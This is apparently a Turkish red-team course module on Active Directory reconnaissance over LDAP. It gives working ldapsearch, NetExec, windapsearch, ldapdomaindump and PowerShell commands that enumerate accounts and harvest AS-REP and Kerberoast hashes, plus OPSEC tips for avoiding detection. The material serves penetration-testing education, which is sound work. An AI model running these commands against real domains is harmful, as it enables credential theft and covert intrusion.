## 1. Kavramsal Temel — Neden Var?

Active Directory'nin kalbi bir **LDAP (Lightweight Directory Access Protocol) veritabanıdır**. Domain'deki her kullanıcı, grup, bilgisayar, GPO, OU ve güven ilişkisi bu dizinde bir **nesne (object)** olarak durur. Bir saldırganın domain'i "haritalamak" için sömürüye ihtiyacı yoktur — çünkü AD'nin **temel bir tasarım gerçeği** vardır:

> **Kimliği doğrulanmış (authenticated) HERHANGİ bir domain kullanıcısı, dizinin büyük çoğunluğunu okuyabilir.** Bu bir açık (bug) değil, AD'nin çalışması için gereken bir özelliktir (feature) — istemciler oturum açmak, GPO bulmak, SPN çözmek için dizini okumak zorundadır.

Bu yüzden keşif, kill chain'in en sessiz ve en verimli adımıdır. Tek bir sıradan hesap (hatta bir makine hesabı), tüm Kerberoast edilebilir hesapları, tehlikeli ACL'leri, delegation'lı makineleri ve admin gruplarını **hiçbir istismar olmadan** dökebilir.

**Analoji:** AD'yi bir şirketin telefon rehberi + bina kroki + yetki listesi olarak düşün. İçeri girmek için kimlik gösterirsin (authenticate), ama bir kez içerideysen rehberin tamamı önündedir — kimin CEO'ya vekâlet ettiği (delegation), hangi kapının anahtarı kimde (ACL) dahil.

**İki keşif kipi:**
| Kip | Ne gerekir | Ne görürsün |
|-----|-----------|-------------|
| **Yetkisiz (unauthenticated)** | Sadece ağ erişimi | Anonim bind çoğu modern DC'de kapalı; yine de RootDSE, domain adı, DC isimleri, bazen null-session paylaşımlar |
| **Yetkili (authenticated)** | Herhangi bir domain hesabı | Neredeyse tüm dizin: kullanıcılar, gruplar, SPN'ler, ACL'ler, GPO'lar, trust'lar |

## 2. Teknik Derinlik — LDAP Protokolü ve Naming Context'ler

### 2.1 RootDSE — anonim erişimin bıraktığı kapı

Bir DC'ye LDAP bağlantısı açıldığında, **bind yapmadan önce** bile okunabilen özel bir giriş vardır: **RootDSE** (DSA-Specific Entry, boş DN `""`). AD'nin "kim olduğunu" burada anonim ilan eder:

```
LDAP TCP/389 (clear) · TCP/636 (LDAPS) · TCP/3268 (GC) · TCP/3269 (GC-SSL)

Client                                   Domain Controller
  │  bindRequest (anonymous / simple)      │
  │───────────────────────────────────────▶│
  │  searchRequest baseObject="" scope=base │   ← RootDSE, bind gerekmez
  │───────────────────────────────────────▶│
  │  searchResEntry:                        │
  │   defaultNamingContext: DC=corp,DC=local│
  │   rootDomainNamingContext: DC=corp,...  │
  │   configurationNamingContext: CN=Config │
  │   schemaNamingContext: CN=Schema,...    │
  │   dnsHostName: DC01.corp.local          │
  │   domainFunctionality / forestFunc.: 7  │  ← 2016 seviyesi
  │◀───────────────────────────────────────│
```

RootDSE sana **naming context'leri** (dizinin partition kökleri) verir — sonraki tüm aramaların `-b` (base DN) değeri buradan gelir.

### 2.2 Üç partition, farklı hazineler

| Naming Context | Base DN | İçindeki hazine |
|----------------|---------|-----------------|
| **Domain** | `DC=corp,DC=local` | Kullanıcı/grup/bilgisayar/GPO nesneleri, `objectSid`, `memberOf`, `servicePrincipalName` |
| **Configuration** | `CN=Configuration,DC=corp,DC=local` | Site'lar, subnet'ler, **tüm forest'taki DC listesi**, LDAP servis bağlantıları |
| **Schema** | `CN=Schema,CN=Configuration,...` | Nitelik/sınıf tanımları — özel öznitelikleri (parola alanları vb.) bulmak için |

> **Port 3268 (Global Catalog) inceliği:** GC, **tüm forest'ın** kısmi bir kopyasını taşır. Tek bir GC sorgusuyla çoklu-domain forest'ın her yerindeki nesneleri ararsın — child domain'lere ayrı ayrı bağlanmaya gerek kalmadan. Red için altın: forest-geniş SPN/grup keşfi tek atışta.

### 2.3 LDAP filtre söz dizimi (RFC 4515) — silahınız budur

LDAP filtreleri **öneksel (prefix) / lehçe** yazılır ve `userAccountControl` gibi **bit alanları** için özel matching-rule OID'leri kullanılır:

```
(&(objectClass=user)(objectCategory=person))         # normal kullanıcılar
1.2.840.113556.1.4.803  = "bit AND eşittir" (LDAP_MATCHING_RULE_BIT_AND)
1.2.840.113556.1.4.804  = "bit OR"
1.2.840.113556.1.4.1941 = "zincirli üyelik" (LDAP_MATCHING_RULE_IN_CHAIN)
```

`userAccountControl` bayrakları (kritik bitler):
| Bit (ondalık) | Anlam | Red için değeri |
|---------------|-------|-----------------|
| `0x0002` | ACCOUNTDISABLE | Devre dışı hesapları ele | 
| `0x0020` | PASSWD_NOTREQD | Parolasız/zayıf hesap |
| `0x0400` | TRUSTED_FOR_DELEGATION | **Unconstrained delegation** → [Modül 06](../Modul_06_Kerberos_Delegation_Saldirilari/) |
| `0x800000` | DONT_REQ_PREAUTH | **AS-REP Roast edilebilir** → [Modül 03](../Modul_03_Kimlik_Bilgisi_Erisimi/) |

### 2.4 LDAP mesajının içi — ASN.1/BER ve MaxPageSize tuzağı

LDAP mesajları **ASN.1 BER** (Basic Encoding Rules) ile kodlanır. Bir `searchRequest` PDU'sunun alanları:

```
SearchRequest ::= [APPLICATION 3] SEQUENCE {
     baseObject      LDAPDN,             -- "DC=corp,DC=local"
     scope           ENUMERATED { baseObject(0), singleLevel(1), wholeSubtree(2) },
     derefAliases    ENUMERATED { ... },
     sizeLimit       INTEGER,            -- 0 = sunucu limiti (MaxPageSize)
     timeLimit       INTEGER,
     typesOnly       BOOLEAN,
     filter          Filter,             -- (&(objectClass=user)...)  RFC 4515
     attributes      AttributeSelection }  -- geri istenen öznitelikler
```

> **MaxPageSize tuzağı (kritik OPSEC):** AD, tek yanıtta **varsayılan 1000 nesne** döndürür (`MaxPageSize`). 4000 kullanıcılı bir domain'de tek sorgu yalnızca 1000 döner — gerisini kaçırırsın. Çözüm **paged search control** (OID `1.2.840.113556.1.4.319`): sonuçları 1000'lik sayfalar hâlinde çek. `ldapsearch -E pr=1000/noprompt`, PowerView otomatik sayfalar. Sayfalamayı unutmak = eksik keşif = kaçırılan hedef.

**SASL bind vs. simple bind:** `simple` bind parolayı **açık metin** yollar (LDAPS değilse ağda görünür). `GSS-SPNEGO`/`Kerberos` (SASL) bind ise parola göndermez, bilet kullanır — hem daha güvenli hem savunmacının 4624 dışında ayırt etmesi zor. Kerberos bind (`ldapsearch -Y GSSAPI`) OPSEC açısından tercih edilir.

### 2.5 Global Catalog vs. Domain Controller sorgu farkı

| Özellik | DC (389/636) | GC (3268/3269) |
|---------|--------------|----------------|
| Kapsam | Tek domain, **tüm öznitelikler** | Tüm forest, **kısmi öznitelik seti (PAS)** |
| Yazılabilir mi | Evet | Hayır (salt-okunur) |
| Red kullanımı | Derin tek-domain keşif | Forest-geniş SPN/grup/kullanıcı tek atışta |

> GC'de bir öznitelik boş dönüyorsa, o öznitelik "Partial Attribute Set"e dahil değildir — tam değeri için DC'ye (389) git. Örn. bazı özel öznitelikler GC'de replike olmaz.

## 3. Pratik Uygulama — Çok Araçlı Enumerasyon

### 3.1 Anonim / yetkisiz (Linux `ldapsearch`)

```bash
# RootDSE — bind YOK, sadece ağ erişimi. Domain'i, DC adını, fonksiyon seviyesini ver.
ldapsearch -x -H ldap://10.10.10.5 -s base -b "" \
  defaultNamingContext dnsHostName domainFunctionality

# Anonim bind ile domain nesneleri denemesi (modern DC'lerde çoğu kapalı → sonuç boşsa normal)
ldapsearch -x -H ldap://10.10.10.5 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

### 3.2 Yetkili — düşük-yetki hesapla tam döküm

```bash
# nxc (NetExec) — en hızlı ilk döküm: kullanıcılar, parola politikası, delegation
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --users
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --pass-pol
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --trusted-for-delegation
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --asreproast asrep.txt   # DONT_REQ_PREAUTH
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --kerberoasting kerb.txt # SPN'li hesaplar

# ham ldapsearch — AS-REP roast adayları (DONT_REQ_PREAUTH biti = 0x800000)
ldapsearch -x -H ldap://10.10.10.5 -D "jdoe@corp.local" -w 'Summer2024!' \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# SPN'li (Kerberoastable) hesaplar
ldapsearch ... "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Unconstrained delegation makine/hesapları (TRUSTED_FOR_DELEGATION = 0x80000)
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName
```

**Örnek çıktı (AS-REP adayı):**
```
# svc-backup, Users, corp.local
dn: CN=svc-backup,CN=Users,DC=corp,DC=local
sAMAccountName: svc-backup       ← ön kimlik doğrulama kapalı, hash offline kırılabilir
```

### 3.3 Windows-yerleşik (LOLBin — araç yüklemeden)

```powershell
# PowerShell + ADSI — hiçbir araç indirmeden, sadece .NET DirectorySearcher
$s = [adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))"
$s.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname'))
$s.FindAll() | ForEach-Object { $_.Properties.samaccountname }

# RSAT varsa AD modülü (çok "gürültülü" değil, meşru admin aracı → OPSEC iyi)
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'

# dsquery / net (yerleşik) — en düşük iz
dsquery * -filter "(servicePrincipalName=*)" -attr samAccountName servicePrincipalName
```

### 3.4 windapsearch / ldapdomaindump / AD Explorer (tam döküm)

```bash
# windapsearch — sık kullanılan sorguları hazır komutlarla verir
windapsearch.py -d corp.local -u jdoe -p 'Summer2024!' --dc-ip 10.10.10.5 -U    # tüm kullanıcılar
windapsearch.py ... --da              # Domain Admins üyeleri
windapsearch.py ... --unconstrained   # unconstrained delegation
windapsearch.py ... --custom "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"  # AS-REP

# ldapdomaindump — tüm dizini gezinebilir HTML + JSON + Greppable'a döker (offline analiz)
ldapdomaindump -u 'corp.local\jdoe' -p 'Summer2024!' 10.10.10.5 -o loot/
#  → domain_users.html, domain_computers.html, domain_groups.html, domain_trusts.html
```

**Sysinternals AD Explorer (GUI, çok sessiz):** DC'ye bağlan → **Snapshot al** (`.dat`). Snapshot'ı çevrimdışı, DC'ye tekrar dokunmadan istediğin kadar tara → keşif izini tek bağlantıya indirir. Mavi takım için "meşru admin aracı" gibi görünür.

### 3.5 Windows GUI — `LDP.exe`

`LDP.exe` (RSAT ile gelir): `Connection → Bind` sonra `Browse → Search`. Base DN `DC=corp,DC=local`, filter alanına yukarıdaki filtreler. GUI keşif, EDR'lerde çoğu zaman meşru admin davranışı sayıldığından **düşük-iz** bir seçenektir.

### 3.6 Gerçek-dünya keşif zinciri (tek foothold'dan)

```
   jdoe kimliği ele geçti  →  öncelik sırasıyla LDAP damıtma:
   1) --pass-pol        → kilitleme eşiği (spray planı için)
   2) DONT_REQ_PREAUTH  → AS-REP roast adayları (bedava hash)  → Modül 03
   3) servicePrincipalName=*  → Kerberoast havuzu               → Modül 03
   4) TRUSTED_FOR_DELEGATION / msDS-AllowedToDelegateTo → delegation → Modül 06
   5) adminCount=1      → korunan yüksek-değerli hesaplar        → hedef listesi
   6) ms-MCS-AdmPwd okunabilir mi → LAPS parola sızıntısı (yanlış ACL)
   Her adım TEK LDAP sorgusu, hepsi tek bağlantıda, dakikalar içinde.
```

**OPSEC notları:**
- **Event 1644** (dizin hizmeti pahalı/verimsiz aramalar) yalnızca `15 Field Engineering` registry ayarı açıksa loglanır — çoğu ortamda kapalı, bu yüzden LDAP enum genelde **loglanmaz**. Bu, keşfi bu kadar sessiz yapan şeydir.
- **Yavaşla, sayfala.** Tek bir dev `(objectClass=*)` sorgusu SACL'li ortamlarda dikkat çeker. Hedefli filtreler (sadece SPN'ler, sadece AS-REP adayları) hem hızlı hem sessizdir.
- LDAPS (636) kullan → içerik ağ IDS'inde şifreli görünür.
